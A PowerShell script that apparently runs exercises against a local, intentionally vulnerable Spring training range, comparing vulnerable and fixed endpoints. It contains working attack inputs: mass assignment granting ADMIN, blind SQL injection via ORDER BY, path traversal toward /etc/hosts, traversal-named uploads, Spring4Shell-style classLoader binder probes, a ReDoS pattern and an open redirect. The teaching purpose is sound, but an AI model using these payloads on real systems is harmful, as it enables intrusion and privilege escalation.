# PowerShell wrapper for attacks/04-validation-binding.sh
# Run from PowerShell: .\scripts\run_attack_m04.ps1

$ErrorActionPreference = "Stop"
$ROOT = "C:\Users\uniqo\Downloads\spring-vuln-range\spring-vuln-range"
$PORT = 8084
$TMP_DIR = [System.IO.Path]::GetTempPath()
$BASE = "http://127.0.0.1:${PORT}"

function Write-Title($msg) {
    Write-Host ""
    Write-Host "-------------------------------------------------------------------------------"
    Write-Host "  $msg"
    Write-Host "-------------------------------------------------------------------------------"
}

function Write-Note($msg) {
    Write-Host "  >> $msg"
}

function Invoke-Request($method, $path, $body, $contentType) {
    $url = "${BASE}${path}"
    $params = @{ Uri = $url; Method = $method; UseBasicParsing = $true }
    if ($contentType) { $params["ContentType"] = $contentType }
    if ($body) { $params["Body"] = $body }
    try {
        $response = Invoke-WebRequest @params
        Write-Host "  $method $path"
        Write-Host "    $([string]$response.Content)"
        Write-Host "    <status:$($response.StatusCode)>"
    } catch {
        Write-Host "  $method $path"
        Write-Host "    <status:$($_.Exception.Response.StatusCode.value__)>"
    }
}

# Check if service is up
try {
    Invoke-WebRequest -Uri "${BASE}/" -UseBasicParsing -TimeoutSec 3 > $null
} catch {
    Write-Host "Module on port $PORT is not answering."
    Write-Host "Start it with: scripts\run-module.sh m04-validation-binding"
    exit 1
}

Write-Host "==============================================================================="
Write-Host " 04 · input validation and data binding (port ${PORT})"
Write-Host "==============================================================================="
Write-Host " target: 127.0.0.1 (loopback) - educational range, intentionally vulnerable"

# Title 1
Write-Title "1. Mass assignment through form binding (CWE-915)"
Write-Note "The form fields map onto the persistence entity, so 'role' and 'priceOverride' are inputs."
Invoke-Request "POST" "/vuln4/users" "username=attacker&email=a@example.invalid&role=ADMIN&monthlyLimit=999999&priceOverride=0" "application/x-www-form-urlencoded"
Write-Note "Same request against /safe4: the DTO has no such fields, and unknown JSON fields are rejected."
Invoke-Request "POST" "/safe4/users" '{"username":"attacker","email":"a@example.invalid","role":"ADMIN","monthlyLimit":999999}' "application/json"
Write-Host "  (note: /safe4/users expects JSON; the form call above is the contrast case)"

# Title 2
Write-Title "2. Mass assignment through JSON"
Invoke-Request "POST" "/vuln4/users/json" '{"username":"m1","email":"m1@example.invalid","role":"ADMIN","priceOverride":-1}' "application/json"

# Title 3
Write-Title "3. No bounds on input: absurd lengths and shapes are accepted"
$LONG = "A" * 400
Invoke-Request "POST" "/vuln4/notes" ("{`"body`":`"${LONG}`"}") "application/json"
Write-Note "A length/format rule at the boundary removes a whole class of downstream problems."
$SHORT = "A" * 80
Invoke-Request "POST" "/safe4/search" ("{`"query`":`"${SHORT}`",`"input`":`"x`"}") "application/json"

# Title 4
Write-Title "4. ORDER BY taken from the request (identifiers cannot be parameterised)"
Invoke-Request "GET" "/vuln4/subscriptions?sort=monthly_price&direction=desc&plan=ESPD-BASIC"
Write-Note "Blind extraction through a CASE expression, with no quotes needed:"
Invoke-Request "GET" "/vuln4/subscriptions?sort=(CASE%20WHEN%20(1=1)%20THEN%20id%20ELSE%20plan%20END)&direction=asc&plan=ESPD-BASIC"
Write-Note "Reference implementation resolves both sort and direction from an allow-list:"
Invoke-Request "GET" "/safe4/subscriptions?sort=monthly_price&direction=desc&plan=ESPD-BASIC"
Invoke-Request "GET" "/safe4/subscriptions?sort=password_hash&direction=desc&plan=ESPD-BASIC"

# Title 5
Write-Title "5. Path traversal in a file read (CWE-22)"
$PROBE_FILE = Join-Path $TMP_DIR "vulnrange-probe.txt"
Set-Content -Path $PROBE_FILE -Value "staged-by-the-upload-endpoint" -NoNewline
Write-Host "  staging file at: $PROBE_FILE"
# Upload via multipart
$fileParam = New-Object System.Net.Http.MultipartFormDataContent
$disposition = "form-data; name=`"file`"; filename=`"probe.txt`""
$fileContent = [System.Net.Http.StreamContent]::new([System.IO.File]::OpenRead($PROBE_FILE))
$fileContent.Headers.Add("Content-Disposition", $disposition)
$fileParam.Add($fileContent)
try {
    $client = New-Object System.Net.Http.HttpClient
    $uploadResponse = $client.PostAsync("${BASE}/vuln4/upload", $fileParam).Result
    Write-Host "  POST /vuln4/upload -> status: $($uploadResponse.StatusCode)"
    $client.Dispose()
} catch {
    Write-Host "  POST /vuln4/upload -> error: $($_.Exception.Message)"
}
Invoke-Request "GET" "/vuln4/files/probe.txt"
Write-Note "Directory-climbing attempt: Spring's default HttpFirewall rejects %2F/%5C and %2e sequences,"
Write-Note "so the encoded variant is refused by the firewall. That is one of the few defaults that saves"
Write-Note "you - it is not the application checking anything, which is why /safe4 normalises and checks too."
Invoke-Request "GET" "/vuln4/files/%2e%2e%2f%2e%2e%2fetc%2fhosts"
Write-Note "Reference implementation normalises and checks containment:"
Invoke-Request "GET" "/safe4/files/%2e%2e%2f%2e%2e%2fetc%2fhosts"

# Title 6
Write-Title "6. Upload with no size, type or filename checks"
$UPLOAD_PROBE = Join-Path $TMP_DIR "vulnrange-upload-probe.txt"
Set-Content -Path $UPLOAD_PROBE -Value "not-a-text-file-but-the-server-does-not-care" -NoNewline
$UPLOAD_PROBE_EXE = Join-Path $TMP_DIR "vulnrange-upload-probe.txt.exe"
Set-Content -Path $UPLOAD_PROBE_EXE -Value "evil" -NoNewline

# Upload to vuln4 with traversal filename
$fileParam2 = New-Object System.Net.Http.MultipartFormDataContent
$disposition2 = "form-data; name=`"file`"; filename=`"../../../../tmp/vulnrange-escapes-upload-root.txt`""
$fileContent2 = [System.Net.Http.StreamContent]::new([System.IO.File]::OpenRead($UPLOAD_PROBE))
$fileContent2.Headers.Add("Content-Disposition", $disposition2)
$fileParam2.Add($fileContent2)
try {
    $client = New-Object System.Net.Http.HttpClient
    $uploadResponse = $client.PostAsync("${BASE}/vuln4/upload", $fileParam2).Result
    Write-Host "  POST /vuln4/upload -> status: $($uploadResponse.StatusCode)"
    $client.Dispose()
} catch {
    Write-Host "  POST /vuln4/upload -> error: $($_.Exception.Message)"
}
Write-Host "  did it escape the upload directory?"

# Upload to safe4 - valid file
$fileParam3 = New-Object System.Net.Http.MultipartFormDataContent
$disposition3 = "form-data; name=`"file`"; filename=`"report.txt`""
$fileContent3 = [System.Net.Http.StreamContent]::new([System.IO.File]::OpenRead($UPLOAD_PROBE))
$fileContent3.Headers.Add("Content-Disposition", $disposition3)
$fileParam3.Add($fileContent3)
try {
    $client = New-Object System.Net.Http.HttpClient
    $uploadResponse = $client.PostAsync("${BASE}/safe4/upload", $fileParam3).Result
    Write-Host "  POST /safe4/upload (report.txt) -> status: $($uploadResponse.StatusCode)"
    $client.Dispose()
} catch {
    Write-Host "  POST /safe4/upload (report.txt) -> error: $($_.Exception.Message)"
}

# Upload to safe4 - exe file (should be rejected)
$fileParam4 = New-Object System.Net.Http.MultipartFormDataContent
$disposition4 = "form-data; name=`"file`"; filename=`"report.exe`""
$fileContent4 = [System.Net.Http.StreamContent]::new([System.IO.File]::OpenRead($UPLOAD_PROBE_EXE))
$fileContent4.Headers.Add("Content-Disposition", $disposition4)
$fileParam4.Add($fileContent4)
try {
    $client = New-Object System.Net.Http.HttpClient
    $uploadResponse = $client.PostAsync("${BASE}/safe4/upload", $fileParam4).Result
    Write-Host "  POST /safe4/upload (report.exe) -> status: $($uploadResponse.StatusCode)"
    $client.Dispose()
} catch {
    Write-Host "  POST /safe4/upload (report.exe) -> error: $($_.Exception.Message)"
}

Write-Note "Reference implementation: size cap, extension allow-list, magic bytes, generated filename."

# Title 7
Write-Title "7. Binder exposure (the Spring4Shell shape)"
Write-Note "On a patched Spring the class-resolver chain is dead; the DTO boundary is the actual fix."
Invoke-Request "POST" "/vuln4/binder-probe" "role=ADMIN&probe=class.classLoader.name" "application/x-www-form-urlencoded"
Invoke-Request "POST" "/vuln4/binder-probe" "class.module.classLoader=default" "application/x-www-form-urlencoded"

# Title 8
Write-Title "8. ReDoS through a user-supplied regular expression"
Invoke-Request "POST" "/vuln4/search/regex" '{"pattern":"(a+)+$","input":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaab"}' "application/json"
Write-Note "Same intent, bounded engine:"
Invoke-Request "POST" "/safe4/search" '{"query":"aaa","input":"aaab"}' "application/json"

# Title 9
Write-Title "9. Open redirect and unbounded export"
Invoke-Request "GET" "/vuln4/redirect?url=http://evil.example.invalid/phishing"
Invoke-Request "GET" "/safe4/redirect?url=http://evil.example.invalid/phishing"
Invoke-Request "GET" "/safe4/redirect?url=subscriptions"
Invoke-Request "GET" "/vuln4/export?size=2000000"
Invoke-Request "GET" "/safe4/export?size=2000000"

Write-Host ""
Write-Host "==============================================================================="
Write-Host " done · details and fixes: docs/04-validation-binding.md"
Write-Host "==============================================================================="
